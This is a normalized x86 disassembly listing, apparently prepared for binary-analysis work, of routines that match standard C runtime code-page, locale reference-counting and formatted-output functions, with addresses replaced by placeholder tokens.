retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_4138d2
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_4105f0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rwxdata
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_413936
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_419a91
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_419964
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_419964
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_4105f0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_413ac6
push 0xc
push r--data
call sub_40f510
call sub_41258b
mov edi eax
mov eax [ rwxdata ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rwxdata ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413b61
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rwxdata ]
mov [ edi + 0x68 ] eax
mov esi [ rwxdata ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_40f555
retn
push 0x20
call sub_40cead
cmp esi rwxdata
je r-xdata
push esi
call sub_40b955
pop ecx
sub_413b6a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov [ rwxdata ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rwxdata ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rwxdata ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rwxdata ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_413be6
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_413b6a
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_4138d2
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4105f0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rwxdata ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rwxdata ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_4138a3
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rwxdata ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_413936
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rwxdata ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rwxdata ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4105f0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4138a3
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_413dcf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax [ eax + 0x4 ]
je r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_413e0d
push 0x14
push r--data
call sub_40f510
or [ ebp - 0x20 ] 0xffffffff
call sub_41258b
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_413ac6
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_413b6a
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_40eec5
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_40f555
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_413be6
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rwxdata
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rwxdata
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40b955
pop ecx
test [ rwxdata ] 0x1
jne r-xdata
push eax
call sub_40b955
pop ecx
push 0xd
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rwxdata ] eax
mov eax [ ebx + 0x8 ]
mov [ rwxdata ] eax
mov eax [ ebx + 0xc ]
mov [ rwxdata ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rwxdata ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rwxdata ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rwxdata ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rwxdata ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rwxdata ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413f6e
jmp r-xdata
mov eax [ rwxdata ]
cmp eax rwxdata
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_40b955
pop ecx
sub_413fc5
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rwxdata
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_414054
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rwxdata
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_4140ed
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rwxdata
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rwxdata
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40b955
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40b955
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40b955
push [ esi + 0xc0 ]
call sub_40b955
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_41a2d0
push [ esi + 0xd4 ]
call sub_40b955
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rwxdata
je r-xdata
push esi
call sub_40b955
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40b955
pop ecx
push [ esi + 0xb0 ]
call sub_40b955
push [ esi + 0xbc ]
call sub_40b955
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40b955
push [ esi + 0xbc ]
call sub_41a97d
pop ecx
pop ecx
push eax
call sub_40b955
pop ecx
push eax
call sub_40b955
push [ esi + 0xbc ]
call sub_41a6f4
pop ecx
pop ecx
sub_414238
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_413fc5
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_414054
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rwxdata
je r-xdata
push esi
call sub_4140ed
pop ecx
sub_414285
push 0xc
push r--data
call sub_40f510
call sub_41258b
mov esi eax
mov eax [ rwxdata ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rwxdata ]
add esi 0x6c
push esi
call sub_414238
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4142f2
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_41258b
mov esi [ eax + 0x6c ]
mov eax esi
call sub_40f555
retn
push 0x20
call sub_40cead
sub_4142fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_40d1fa
mov [ eax ] 0x2a
call sub_40d1fa
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_40d1fa
push 0x22
pop esi
mov [ eax ] esi
call sub_40e72d
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_4105f0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_4105f0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_414470
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push [ ebp + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_40d831
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push eax
call sub_4142fe
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x4 ]
jmp r-xdata
leave
retn
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_4144c1
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push [ ebp + 0xc ]
call sub_41b1d7
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_4142fe
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
leave
retn
mov eax [ ebp - 0x4 ]
leave
retn
sub_4144f3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_414712
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_414738
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_41475e
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_414784
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_4147b0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_414845
mov edi edi
push ebp
mov ebp esp
push ebx
mov bl [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov al [ esi + 0x8 ]
cmp al 0x70
je r-xdata
xor ecx ecx
cmp al bl
sete cl
mov eax ecx
cmp bl 0x70
je r-xdata
cmp al 0x73
je r-xdata
xor edx edx
inc edx
cmp al 0x53
je r-xdata
xor ecx ecx
inc ecx
cmp bl 0x53
je r-xdata
xor edx edx
jmp r-xdata
cmp edx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x73
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ebp + 0x14 ]
mov eax 0x810
and ecx eax
neg ecx
sbb ecx ecx
and edx eax
neg ecx
neg edx
sbb edx edx
neg edx
cmp ecx edx
jne r-xdata
mov dl 0x64
cmp al dl
je r-xdata
test edx edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp al 0x69
je r-xdata
xor eax eax
inc eax
cmp bl 0x69
je r-xdata
cmp al dl
je r-xdata
cmp al 0x6f
je r-xdata
mov eax [ esi + 0xc ]
mov ecx eax
xor ecx [ ebp + 0x14 ]
test ecx 0x10000
jne r-xdata
cmp bl 0x6f
je r-xdata
cmp al 0x69
je r-xdata
cmp al 0x75
je r-xdata
xor eax [ ebp + 0x14 ]
test al 0x20
jne r-xdata
cmp bl 0x75
je r-xdata
cmp al 0x6f
je r-xdata
cmp al 0x78
je r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
sete al
jmp r-xdata
cmp bl 0x78
je r-xdata
cmp al 0x75
je r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x58
je r-xdata
cmp al 0x78
je r-xdata
cmp bl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x69
je r-xdata
cmp ecx eax
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x6f
je r-xdata
cmp bl dl
je r-xdata
cmp bl 0x75
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x58
jne r-xdata
sub_414970
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40d6cd
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_4149a3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_414970
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_4149c9
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_414970
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_40d1fa
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_414970
sub_414a2b
mov edi edi
push ebp
mov ebp esp
sub esp 0x8d0
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
xor ebx ebx
lea ecx [ ebp - 0x878 ]
mov [ ebp - 0x8b8 ] esi
mov [ ebp - 0x854 ] eax
mov [ ebp - 0x8b4 ] ebx
mov [ ebp - 0x850 ] ebx
mov [ ebp - 0x89c ] ebx
mov [ ebp - 0x8bc ] ebx
mov [ ebp - 0x8a0 ] ebx
call sub_40d831
or [ ebp - 0x860 ] 0xffffffff
mov [ ebp - 0x898 ] ebx
cmp esi ebx
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x86c ] bl
cmp edi ebx
je r-xdata
push esi
call sub_410551
pop ecx
mov edx rwxdata
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x870 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x87c ] ebx
mov [ ebp - 0x8d0 ] edi
mov [ ebp - 0x864 ] ebx
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
mov eax [ ebp - 0x8d0 ]
or [ ebp - 0x894 ] 0xffffffff
or [ ebp - 0x880 ] 0xffffffff
or [ ebp - 0x860 ] 0xffffffff
mov [ ebp - 0x8a8 ] ebx
mov [ ebp - 0x8a4 ] ebx
mov [ ebp - 0x8b0 ] ebx
mov [ ebp - 0x890 ] ebx
mov [ ebp - 0x858 ] ebx
mov bl [ eax ]
mov [ ebp - 0x85c ] bl
test bl bl
je r-xdata
cmp [ ebp - 0x860 ] ebx
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rwxdata ]
jmp r-xdata
inc [ ebp - 0x864 ]
cmp [ ebp - 0x864 ] 0x2
jge r-xdata
mov esi eax
jmp r-xdata
cmp [ ebp - 0x86c ] 0x0
je r-xdata
xor ebx ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
